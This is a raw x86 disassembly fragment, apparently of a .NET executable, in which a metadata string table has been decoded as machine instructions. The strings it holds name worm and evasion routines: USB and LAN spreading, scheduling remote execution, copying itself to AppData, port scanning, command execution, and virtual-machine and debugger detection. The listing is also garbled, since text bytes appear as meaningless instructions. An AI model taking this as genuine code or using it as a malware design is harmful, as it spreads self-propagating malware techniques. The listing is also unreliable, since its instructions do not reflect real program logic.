  405a4d:	74 65                	je     0x405ab4
  405a4f:	45                   	inc    %ebp
  405a50:	78 65                	js     0x405ab7
  405a52:	63 75 74             	arpl   %esi,0x74(%ebp)
  405a55:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  405a5c:	63 3e                	arpl   %edi,(%esi)
  405a5e:	64 5f                	fs pop %edi
  405a60:	5f                   	pop    %edi
  405a61:	31 30                	xor    %esi,(%eax)
  405a63:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  405a66:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405a69:	44                   	inc    %esp
  405a6a:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405a71:	6c                   	insb   (%dx),%es:(%edi)
  405a72:	61                   	popa
  405a73:	73 73                	jae    0x405ae8
  405a75:	31 30                	xor    %esi,(%eax)
  405a77:	5f                   	pop    %edi
  405a78:	30 00                	xor    %al,(%eax)
  405a7a:	3c 3e                	cmp    $0x3e,%al
  405a7c:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405a7f:	33 5f 30             	xor    0x30(%edi),%ebx
  405a82:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  405a85:	74 61                	je     0x405ae8
  405a87:	72 74                	jb     0x405afd
  405a89:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405a8d:	33 5f 30             	xor    0x30(%edi),%ebx
  405a90:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  405a93:	70 70                	jo     0x405b05
  405a95:	6c                   	insb   (%dx),%es:(%edi)
  405a96:	79 3e                	jns    0x405ad6
  405a98:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405a9b:	33 5f 30             	xor    0x30(%edi),%ebx
  405a9e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  405aa1:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405aa4:	34 5f                	xor    $0x5f,%al
  405aa6:	30 00                	xor    %al,(%eax)
  405aa8:	3c 53                	cmp    $0x53,%al
  405aaa:	70 72                	jo     0x405b1e
  405aac:	65 61                	gs popa
  405aae:	64 41                	fs inc %ecx
  405ab0:	73 79                	jae    0x405b2b
  405ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  405ab3:	63 3e                	arpl   %edi,(%esi)
  405ab5:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405ab8:	34 5f                	xor    $0x5f,%al
  405aba:	30 00                	xor    %al,(%eax)
  405abc:	3c 53                	cmp    $0x53,%al
  405abe:	74 61                	je     0x405b21
  405ac0:	72 74                	jb     0x405b36
  405ac2:	53                   	push   %ebx
  405ac3:	70 72                	jo     0x405b37
  405ac5:	65 61                	gs popa
  405ac7:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  405ace:	5f 
  405acf:	34 5f                	xor    $0x5f,%al
  405ad1:	30 00                	xor    %al,(%eax)
  405ad3:	3c 3e                	cmp    $0x3e,%al
  405ad5:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405ad8:	44                   	inc    %esp
  405ad9:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405ae0:	6c                   	insb   (%dx),%es:(%edi)
  405ae1:	61                   	popa
  405ae2:	73 73                	jae    0x405b57
  405ae4:	34 5f                	xor    $0x5f,%al
  405ae6:	30 00                	xor    %al,(%eax)
  405ae8:	3c 3e                	cmp    $0x3e,%al
  405aea:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405aed:	44                   	inc    %esp
  405aee:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405af5:	6c                   	insb   (%dx),%es:(%edi)
  405af6:	61                   	popa
  405af7:	73 73                	jae    0x405b6c
  405af9:	36 5f                	ss pop %edi
  405afb:	30 00                	xor    %al,(%eax)
  405afd:	3c 53                	cmp    $0x53,%al
  405aff:	70 72                	jo     0x405b73
  405b01:	65 61                	gs popa
  405b03:	64 4f                	fs dec %edi
  405b05:	6e                   	outsb  %ds:(%esi),(%dx)
  405b06:	63 65 41             	arpl   %esp,0x41(%ebp)
  405b09:	73 79                	jae    0x405b84
  405b0b:	6e                   	outsb  %ds:(%esi),(%dx)
  405b0c:	63 3e                	arpl   %edi,(%esi)
  405b0e:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405b11:	30 00                	xor    %al,(%eax)
  405b13:	3c 54                	cmp    $0x54,%al
  405b15:	72 79                	jb     0x405b90
  405b17:	53                   	push   %ebx
  405b18:	63 68 65             	arpl   %ebp,0x65(%eax)
  405b1b:	64 75 6c             	fs jne 0x405b8a
  405b1e:	65 52                	gs push %edx
  405b20:	65 6d                	gs insl (%dx),%es:(%edi)
  405b22:	6f                   	outsl  %ds:(%esi),(%dx)
  405b23:	74 65                	je     0x405b8a
  405b25:	45                   	inc    %ebp
  405b26:	78 65                	js     0x405b8d
  405b28:	63 75 74             	arpl   %esi,0x74(%ebp)
  405b2b:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  405b32:	63 3e                	arpl   %edi,(%esi)
  405b34:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405b37:	30 00                	xor    %al,(%eax)
  405b39:	3c 49                	cmp    $0x49,%al
  405b3b:	73 44                	jae    0x405b81
  405b3d:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405b41:	67 65 72 50          	addr16 gs jb 0x405b95
  405b45:	72 6f                	jb     0x405bb6
  405b47:	63 65 73             	arpl   %esp,0x73(%ebp)
  405b4a:	73 52                	jae    0x405b9e
  405b4c:	75 6e                	jne    0x405bbc
  405b4e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b4f:	69 6e 67 3e 62 5f 5f 	imul   $0x5f5f623e,0x67(%esi),%ebp
  405b56:	30 00                	xor    %al,(%eax)
  405b58:	3c 3e                	cmp    $0x3e,%al
  405b5a:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405b5d:	44                   	inc    %esp
  405b5e:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405b65:	6c                   	insb   (%dx),%es:(%edi)
  405b66:	61                   	popa
  405b67:	73 73                	jae    0x405bdc
  405b69:	34 5f                	xor    $0x5f,%al
  405b6b:	31 00                	xor    %eax,(%eax)
  405b6d:	3c 3e                	cmp    $0x3e,%al
  405b6f:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  405b72:	31 00                	xor    %eax,(%eax)
  405b74:	3c 53                	cmp    $0x53,%al
  405b76:	70 72                	jo     0x405bea
  405b78:	65 61                	gs popa
  405b7a:	64 41                	fs inc %ecx
  405b7c:	73 79                	jae    0x405bf7
  405b7e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b7f:	63 3e                	arpl   %edi,(%esi)
  405b81:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405b84:	31 00                	xor    %eax,(%eax)
  405b86:	3c 3e                	cmp    $0x3e,%al
  405b88:	75 5f                	jne    0x405be9
  405b8a:	5f                   	pop    %edi
  405b8b:	31 00                	xor    %eax,(%eax)
  405b8d:	46                   	inc    %esi
  405b8e:	75 6e                	jne    0x405bfe
  405b90:	63 60 31             	arpl   %esp,0x31(%eax)
  405b93:	00 49 45             	add    %cl,0x45(%ecx)
  405b96:	6e                   	outsb  %ds:(%esi),(%dx)
  405b97:	75 6d                	jne    0x405c06
  405b99:	65 72 61             	gs jb  0x405bfd
  405b9c:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  405ba0:	31 00                	xor    %eax,(%eax)
  405ba2:	54                   	push   %esp
  405ba3:	61                   	popa
  405ba4:	73 6b                	jae    0x405c11
  405ba6:	60                   	pusha
  405ba7:	31 00                	xor    %eax,(%eax)
  405ba9:	41                   	inc    %ecx
  405baa:	73 79                	jae    0x405c25
  405bac:	6e                   	outsb  %ds:(%esi),(%dx)
  405bad:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  405bb1:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  405bb5:	68 6f 64 42 75       	push   $0x7542646f
  405bba:	69 6c 64 65 72 60 31 	imul   $0x316072,0x65(%esp,%eiz,2),%ebp
  405bc1:	00 
  405bc2:	54                   	push   %esp
  405bc3:	61                   	popa
  405bc4:	73 6b                	jae    0x405c31
  405bc6:	41                   	inc    %ecx
  405bc7:	77 61                	ja     0x405c2a
  405bc9:	69 74 65 72 60 31 00 	imul   $0x4c003160,0x72(%ebp,%eiz,2),%esi
  405bd0:	4c 
  405bd1:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  405bd8:	61                   	popa
  405bd9:	74 68                	je     0x405c43
  405bdb:	31 00                	xor    %eax,(%eax)
  405bdd:	3c 3e                	cmp    $0x3e,%al
  405bdf:	37                   	aaa
  405be0:	5f                   	pop    %edi
  405be1:	5f                   	pop    %edi
  405be2:	77 72                	ja     0x405c56
  405be4:	61                   	popa
  405be5:	70 31                	jo     0x405c18
  405be7:	00 43 53             	add    %al,0x53(%ebx)
  405bea:	24 3c                	and    $0x3c,%al
  405bec:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
  405bf0:	6c                   	insb   (%dx),%es:(%edi)
  405bf1:	6f                   	outsl  %ds:(%esi),(%dx)
  405bf2:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  405bf5:	73 31                	jae    0x405c28
  405bf7:	00 4d 69             	add    %cl,0x69(%ebp)
  405bfa:	63 72 6f             	arpl   %esi,0x6f(%edx)
  405bfd:	73 6f                	jae    0x405c6e
  405bff:	66 74 2e             	data16 je 0x405c30
  405c02:	57                   	push   %edi
  405c03:	69 6e 33 32 00 55 49 	imul   $0x49550032,0x33(%esi),%ebp
  405c0a:	6e                   	outsb  %ds:(%esi),(%dx)
  405c0b:	74 33                	je     0x405c40
  405c0d:	32 00                	xor    (%eax),%al
  405c0f:	3c 73                	cmp    $0x73,%al
  405c11:	6c                   	insb   (%dx),%es:(%edi)
  405c12:	6f                   	outsl  %ds:(%esi),(%dx)
  405c13:	77 45                	ja     0x405c5a
  405c15:	6e                   	outsb  %ds:(%esi),(%dx)
  405c16:	64 3e 35 5f 5f 32 00 	fs ds xor $0x325f5f,%eax
  405c1d:	3c 62                	cmp    $0x62,%al
  405c1f:	61                   	popa
  405c20:	73 65                	jae    0x405c87
  405c22:	49                   	dec    %ecx
  405c23:	70 3e                	jo     0x405c63
  405c25:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  405c2a:	3c 63                	cmp    $0x63,%al
  405c2c:	6c                   	insb   (%dx),%es:(%edi)
  405c2d:	69 65 6e 74 3e 35 5f 	imul   $0x5f353e74,0x6e(%ebp),%esp
  405c34:	5f                   	pop    %edi
  405c35:	32 00                	xor    (%eax),%al
  405c37:	3c 3e                	cmp    $0x3e,%al
  405c39:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  405c3c:	32 00                	xor    (%eax),%al
  405c3e:	3c 3e                	cmp    $0x3e,%al
  405c40:	75 5f                	jne    0x405ca1
  405c42:	5f                   	pop    %edi
  405c43:	32 00                	xor    (%eax),%al
  405c45:	46                   	inc    %esi
  405c46:	75 6e                	jne    0x405cb6
  405c48:	63 60 32             	arpl   %esp,0x32(%eax)
  405c4b:	00 70 61             	add    %dh,0x61(%eax)
  405c4e:	74 68                	je     0x405cb8
  405c50:	32 00                	xor    (%eax),%al
  405c52:	3c 3e                	cmp    $0x3e,%al
  405c54:	37                   	aaa
  405c55:	5f                   	pop    %edi
  405c56:	5f                   	pop    %edi
  405c57:	77 72                	ja     0x405ccb
  405c59:	61                   	popa
  405c5a:	70 32                	jo     0x405c8e
  405c5c:	00 3c 63             	add    %bh,(%ebx,%eiz,2)
  405c5f:	6f                   	outsl  %ds:(%esi),(%dx)
  405c60:	6e                   	outsb  %ds:(%esi),(%dx)
  405c61:	6e                   	outsb  %ds:(%esi),(%dx)
  405c62:	65 63 74 54 61       	arpl   %esi,%gs:0x61(%esp,%edx,2)
  405c67:	73 6b                	jae    0x405cd4
  405c69:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  405c6f:	3c 74                	cmp    $0x74,%al
  405c71:	61                   	popa
  405c72:	73 6b                	jae    0x405cdf
  405c74:	73 3e                	jae    0x405cb4
  405c76:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  405c7b:	3c 3e                	cmp    $0x3e,%al
  405c7d:	37                   	aaa
  405c7e:	5f                   	pop    %edi
  405c7f:	5f                   	pop    %edi
  405c80:	77 72                	ja     0x405cf4
  405c82:	61                   	popa
  405c83:	70 33                	jo     0x405cb8
  405c85:	00 3c 69             	add    %bh,(%ecx,%ebp,2)
  405c88:	3e 35 5f 5f 34 00    	ds xor $0x345f5f,%eax
  405c8e:	3c 53                	cmp    $0x53,%al
  405c90:	70 72                	jo     0x405d04
  405c92:	65 61                	gs popa
  405c94:	64 41                	fs inc %ecx
  405c96:	73 79                	jae    0x405d11
  405c98:	6e                   	outsb  %ds:(%esi),(%dx)
  405c99:	63 3e                	arpl   %edi,(%esi)
  405c9b:	64 5f                	fs pop %edi
  405c9d:	5f                   	pop    %edi
  405c9e:	34 00                	xor    $0x0,%al
  405ca0:	3c 3e                	cmp    $0x3e,%al
  405ca2:	37                   	aaa
  405ca3:	5f                   	pop    %edi
  405ca4:	5f                   	pop    %edi
  405ca5:	77 72                	ja     0x405d19
  405ca7:	61                   	popa
  405ca8:	70 34                	jo     0x405cde
  405caa:	00 3c 4f             	add    %bh,(%edi,%ecx,2)
  405cad:	70 65                	jo     0x405d14
  405caf:	6e                   	outsb  %ds:(%esi),(%dx)
  405cb0:	46                   	inc    %esi
  405cb1:	61                   	popa
  405cb2:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  405cb6:	6e                   	outsb  %ds:(%esi),(%dx)
  405cb7:	6e                   	outsb  %ds:(%esi),(%dx)
  405cb8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405cbd:	6e                   	outsb  %ds:(%esi),(%dx)
  405cbe:	41                   	inc    %ecx
  405cbf:	73 79                	jae    0x405d3a
  405cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  405cc2:	63 3e                	arpl   %edi,(%esi)
  405cc4:	64 5f                	fs pop %edi
  405cc6:	5f                   	pop    %edi
  405cc7:	35 00 3c 73 68       	xor    $0x68733c00,%eax
  405ccc:	61                   	popa
  405ccd:	72 65                	jb     0x405d34
  405ccf:	3e 35 5f 5f 36 00    	ds xor $0x365f5f,%eax
  405cd5:	3c 53                	cmp    $0x53,%al
  405cd7:	70 72                	jo     0x405d4b
  405cd9:	65 61                	gs popa
  405cdb:	64 4f                	fs dec %edi
  405cdd:	6e                   	outsb  %ds:(%esi),(%dx)
  405cde:	63 65 41             	arpl   %esp,0x41(%ebp)
  405ce1:	73 79                	jae    0x405d5c
  405ce3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ce4:	63 3e                	arpl   %edi,(%esi)
  405ce6:	64 5f                	fs pop %edi
  405ce8:	5f                   	pop    %edi
  405ce9:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
  405ced:	74 5f                	je     0x405d4e
  405cef:	55                   	push   %ebp
  405cf0:	54                   	push   %esp
  405cf1:	46                   	inc    %esi
  405cf2:	38 00                	cmp    %al,(%eax)
  405cf4:	3c 3e                	cmp    $0x3e,%al
  405cf6:	39 00                	cmp    %eax,(%eax)
  405cf8:	3c 49                	cmp    $0x49,%al
  405cfa:	73 50                	jae    0x405d4c
  405cfc:	6f                   	outsl  %ds:(%esi),(%dx)
  405cfd:	72 74                	jb     0x405d73
  405cff:	4f                   	dec    %edi
  405d00:	70 65                	jo     0x405d67
  405d02:	6e                   	outsb  %ds:(%esi),(%dx)
  405d03:	41                   	inc    %ecx
  405d04:	73 79                	jae    0x405d7f
  405d06:	6e                   	outsb  %ds:(%esi),(%dx)
  405d07:	63 3e                	arpl   %edi,(%esi)
  405d09:	64 5f                	fs pop %edi
  405d0b:	5f                   	pop    %edi
  405d0c:	39 00                	cmp    %eax,(%eax)
  405d0e:	3c 4d                	cmp    $0x4d,%al
  405d10:	6f                   	outsl  %ds:(%esi),(%dx)
  405d11:	64 75 6c             	fs jne 0x405d80
  405d14:	65 3e 00 49 73       	gs add %cl,%ds:0x73(%ecx)
  405d19:	52                   	push   %edx
  405d1a:	75 6e                	jne    0x405d8a
  405d1c:	6e                   	outsb  %ds:(%esi),(%dx)
  405d1d:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  405d24:	00 49 73             	add    %cl,0x73(%ecx)
  405d27:	44                   	inc    %esp
  405d28:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405d2c:	67 65 64 4f          	addr16 gs fs dec %edi
  405d30:	72 56                	jb     0x405d88
  405d32:	4d                   	dec    %ebp
  405d33:	00 53 79             	add    %dl,0x79(%ebx)
  405d36:	73 74                	jae    0x405dac
  405d38:	65 6d                	gs insl (%dx),%es:(%edi)
  405d3a:	2e 49                	cs dec %ecx
  405d3c:	4f                   	dec    %edi
  405d3d:	00 50 72             	add    %dl,0x72(%eax)
  405d40:	6f                   	outsl  %ds:(%esi),(%dx)
  405d41:	70 65                	jo     0x405da8
  405d43:	72 74                	jb     0x405db9
  405d45:	79 44                	jns    0x405d8b
  405d47:	61                   	popa
  405d48:	74 61                	je     0x405dab
  405d4a:	00 6d 73             	add    %ch,0x73(%ebp)
  405d4d:	63 6f 72             	arpl   %ebp,0x72(%edi)
  405d50:	6c                   	insb   (%dx),%es:(%edi)
  405d51:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  405d58:	53                   	push   %ebx
  405d59:	79 73                	jns    0x405dce
  405d5b:	74 65                	je     0x405dc2
  405d5d:	6d                   	insl   (%dx),%es:(%edi)
  405d5e:	2e 43                	cs inc %ebx
  405d60:	6f                   	outsl  %ds:(%esi),(%dx)
  405d61:	6c                   	insb   (%dx),%es:(%edi)
  405d62:	6c                   	insb   (%dx),%es:(%edi)
  405d63:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405d68:	6e                   	outsb  %ds:(%esi),(%dx)
  405d69:	73 2e                	jae    0x405d99
  405d6b:	47                   	inc    %edi
  405d6c:	65 6e                	outsb  %gs:(%esi),(%dx)
  405d6e:	65 72 69             	gs jb  0x405dda
  405d71:	63 00                	arpl   %eax,(%eax)
  405d73:	53                   	push   %ebx
  405d74:	70 72                	jo     0x405de8
  405d76:	65 61                	gs popa
  405d78:	64 41                	fs inc %ecx
  405d7a:	73 79                	jae    0x405df5
  405d7c:	6e                   	outsb  %ds:(%esi),(%dx)
  405d7d:	63 00                	arpl   %eax,(%eax)
  405d7f:	53                   	push   %ebx
  405d80:	70 72                	jo     0x405df4
  405d82:	65 61                	gs popa
  405d84:	64 4f                	fs dec %edi
  405d86:	6e                   	outsb  %ds:(%esi),(%dx)
  405d87:	63 65 41             	arpl   %esp,0x41(%ebp)
  405d8a:	73 79                	jae    0x405e05
  405d8c:	6e                   	outsb  %ds:(%esi),(%dx)
  405d8d:	63 00                	arpl   %eax,(%eax)
  405d8f:	49                   	dec    %ecx
  405d90:	73 50                	jae    0x405de2
  405d92:	6f                   	outsl  %ds:(%esi),(%dx)
  405d93:	72 74                	jb     0x405e09
  405d95:	4f                   	dec    %edi
  405d96:	70 65                	jo     0x405dfd
  405d98:	6e                   	outsb  %ds:(%esi),(%dx)
  405d99:	41                   	inc    %ecx
  405d9a:	73 79                	jae    0x405e15
  405d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  405d9d:	63 00                	arpl   %eax,(%eax)
  405d9f:	4f                   	dec    %edi
  405da0:	70 65                	jo     0x405e07
  405da2:	6e                   	outsb  %ds:(%esi),(%dx)
  405da3:	46                   	inc    %esi
  405da4:	61                   	popa
  405da5:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  405da9:	6e                   	outsb  %ds:(%esi),(%dx)
  405daa:	6e                   	outsb  %ds:(%esi),(%dx)
  405dab:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405db0:	6e                   	outsb  %ds:(%esi),(%dx)
  405db1:	41                   	inc    %ecx
  405db2:	73 79                	jae    0x405e2d
  405db4:	6e                   	outsb  %ds:(%esi),(%dx)
  405db5:	63 00                	arpl   %eax,(%eax)
  405db7:	54                   	push   %esp
  405db8:	72 79                	jb     0x405e33
  405dba:	53                   	push   %ebx
  405dbb:	63 68 65             	arpl   %ebp,0x65(%eax)
  405dbe:	64 75 6c             	fs jne 0x405e2d
  405dc1:	65 52                	gs push %edx
  405dc3:	65 6d                	gs insl (%dx),%es:(%edi)
  405dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  405dc6:	74 65                	je     0x405e2d
  405dc8:	45                   	inc    %ebp
  405dc9:	78 65                	js     0x405e30
  405dcb:	63 75 74             	arpl   %esi,0x74(%ebp)
  405dce:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  405dd5:	63 00                	arpl   %eax,(%eax)
  405dd7:	43                   	inc    %ebx
  405dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  405dd9:	6e                   	outsb  %ds:(%esi),(%dx)
  405dda:	6e                   	outsb  %ds:(%esi),(%dx)
  405ddb:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  405de0:	79 6e                	jns    0x405e50
  405de2:	63 00                	arpl   %eax,(%eax)
  405de4:	57                   	push   %edi
  405de5:	61                   	popa
  405de6:	69 74 41 73 79 6e 63 	imul   $0x636e79,0x73(%ecx,%eax,2),%esi
  405ded:	00 
  405dee:	3c 3c                	cmp    $0x3c,%al
  405df0:	53                   	push   %ebx
  405df1:	74 61                	je     0x405e54
  405df3:	72 74                	jb     0x405e69
  405df5:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405df9:	33 5f 30             	xor    0x30(%edi),%ebx
  405dfc:	3e 64 00 3c 3c       	ds add %bh,%fs:(%esp,%edi,1)
  405e01:	53                   	push   %ebx
  405e02:	74 61                	je     0x405e65
  405e04:	72 74                	jb     0x405e7a
  405e06:	53                   	push   %ebx
  405e07:	70 72                	jo     0x405e7b
  405e09:	65 61                	gs popa
  405e0b:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  405e12:	5f 
  405e13:	34 5f                	xor    $0x5f,%al
  405e15:	30 3e                	xor    %bh,(%esi)
  405e17:	64 00 3c 3c          	add    %bh,%fs:(%esp,%edi,1)
  405e1b:	53                   	push   %ebx
  405e1c:	70 72                	jo     0x405e90
  405e1e:	65 61                	gs popa
  405e20:	64 41                	fs inc %ecx
  405e22:	73 79                	jae    0x405e9d
  405e24:	6e                   	outsb  %ds:(%esi),(%dx)
  405e25:	63 3e                	arpl   %edi,(%esi)
  405e27:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405e2a:	31 3e                	xor    %edi,(%esi)
  405e2c:	64 00 54 68 72       	add    %dl,%fs:0x72(%eax,%ebp,2)
  405e31:	65 61                	gs popa
  405e33:	64 00 55 73          	add    %dl,%fs:0x73(%ebp)
  405e37:	62 53 70             	bound  %edx,0x70(%ebx)
  405e3a:	72 65                	jb     0x405ea1
  405e3c:	61                   	popa
  405e3d:	64 00 4c 61 6e       	add    %cl,%fs:0x6e(%ecx,%eiz,2)
  405e42:	53                   	push   %ebx
  405e43:	70 72                	jo     0x405eb7
  405e45:	65 61                	gs popa
  405e47:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  405e4b:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  405e4f:	70 79                	jo     0x405eca
  405e51:	54                   	push   %esp
  405e52:	6f                   	outsl  %ds:(%esi),(%dx)
  405e53:	41                   	inc    %ecx
  405e54:	70 70                	jo     0x405ec6
  405e56:	44                   	inc    %esp
  405e57:	61                   	popa
  405e58:	74 61                	je     0x405ebb
  405e5a:	49                   	dec    %ecx
  405e5b:	66 4e                	dec    %si
  405e5d:	65 65 64 65 64 00 49 	gs gs fs gs add %cl,%fs:0x73(%ecx)
  405e64:	73 
  405e65:	44                   	inc    %esp
  405e66:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405e6a:	67 65 72 41          	addr16 gs jb 0x405eaf
  405e6e:	74 74                	je     0x405ee4
  405e70:	61                   	popa
  405e71:	63 68 65             	arpl   %ebp,0x65(%eax)
  405e74:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405e78:	74 5f                	je     0x405ed9
  405e7a:	49                   	dec    %ecx
  405e7b:	73 41                	jae    0x405ebe
  405e7d:	74 74                	je     0x405ef3
  405e7f:	61                   	popa
  405e80:	63 68 65             	arpl   %ebp,0x65(%eax)
  405e83:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405e87:	74 5f                	je     0x405ee8
  405e89:	43                   	inc    %ebx
  405e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e8b:	6e                   	outsb  %ds:(%esi),(%dx)
  405e8c:	6e                   	outsb  %ds:(%esi),(%dx)
  405e8d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405e92:	00 67 65             	add    %ah,0x65(%edi)
  405e95:	74 5f                	je     0x405ef6
  405e97:	49                   	dec    %ecx
  405e98:	73 43                	jae    0x405edd
  405e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e9b:	6e                   	outsb  %ds:(%esi),(%dx)
  405e9c:	6e                   	outsb  %ds:(%esi),(%dx)
  405e9d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405ea2:	00 41 77             	add    %al,0x77(%ecx)
  405ea5:	61                   	popa
  405ea6:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  405ead:	65 
  405eae:	4f                   	dec    %edi
  405eaf:	6e                   	outsb  %ds:(%esi),(%dx)
  405eb0:	43                   	inc    %ebx
  405eb1:	6f                   	outsl  %ds:(%esi),(%dx)
  405eb2:	6d                   	insl   (%dx),%es:(%edi)
  405eb3:	70 6c                	jo     0x405f21
  405eb5:	65 74 65             	gs je  0x405f1d
  405eb8:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405ebc:	74 5f                	je     0x405f1d
  405ebe:	49                   	dec    %ecx
  405ebf:	73 43                	jae    0x405f04
  405ec1:	6f                   	outsl  %ds:(%esi),(%dx)
  405ec2:	6d                   	insl   (%dx),%es:(%edi)
  405ec3:	70 6c                	jo     0x405f31
  405ec5:	65 74 65             	gs je  0x405f2d
  405ec8:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405ecc:	74 5f                	je     0x405f2d
  405ece:	49                   	dec    %ecx
  405ecf:	73 43                	jae    0x405f14
  405ed1:	61                   	popa
  405ed2:	6e                   	outsb  %ds:(%esi),(%dx)
  405ed3:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  405ed6:	6c                   	insb   (%dx),%es:(%edi)
  405ed7:	61                   	popa
  405ed8:	74 69                	je     0x405f43
  405eda:	6f                   	outsl  %ds:(%esi),(%dx)
  405edb:	6e                   	outsb  %ds:(%esi),(%dx)
  405edc:	52                   	push   %edx
  405edd:	65 71 75             	gs jno 0x405f55
  405ee0:	65 73 74             	gs jae 0x405f57
  405ee3:	65 64 00 4e 65       	gs add %cl,%fs:0x65(%esi)
  405ee8:	77 47                	ja     0x405f31
  405eea:	75 69                	jne    0x405f55
  405eec:	64 00 54 72 69       	add    %dl,%fs:0x69(%edx,%esi,2)
  405ef1:	6d                   	insl   (%dx),%es:(%edi)
  405ef2:	45                   	inc    %ebp
  405ef3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ef4:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  405ef8:	61                   	popa
  405ef9:	64 54                	fs push %esp
  405efb:	6f                   	outsl  %ds:(%esi),(%dx)
  405efc:	45                   	inc    %ebp
  405efd:	6e                   	outsb  %ds:(%esi),(%dx)
  405efe:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  405f02:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  405f06:	65 43                	gs inc %ebx
  405f08:	6f                   	outsl  %ds:(%esi),(%dx)
  405f09:	6d                   	insl   (%dx),%es:(%edi)
  405f0a:	6d                   	insl   (%dx),%es:(%edi)
  405f0b:	61                   	popa
  405f0c:	6e                   	outsb  %ds:(%esi),(%dx)
  405f0d:	64 00 63 6f          	add    %ah,%fs:0x6f(%ebx)
  405f11:	6d                   	insl   (%dx),%es:(%edi)
  405f12:	6d                   	insl   (%dx),%es:(%edi)
  405f13:	61                   	popa
  405f14:	6e                   	outsb  %ds:(%esi),(%dx)
  405f15:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  405f19:	6e                   	outsb  %ds:(%esi),(%dx)
  405f1a:	64 00 72 6e          	add    %dh,%fs:0x6e(%edx)
  405f1e:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  405f22:	74 5f                	je     0x405f83
  405f24:	49                   	dec    %ecx
  405f25:	73 42                	jae    0x405f69
  405f27:	61                   	popa
  405f28:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  405f2b:	72 6f                	jb     0x405f9c
  405f2d:	75 6e                	jne    0x405f9d
  405f2f:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  405f33:	76 6f                	jbe    0x405fa4
  405f35:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  405f39:	74 68                	je     0x405fa3
  405f3b:	6f                   	outsl  %ds:(%esi),(%dx)
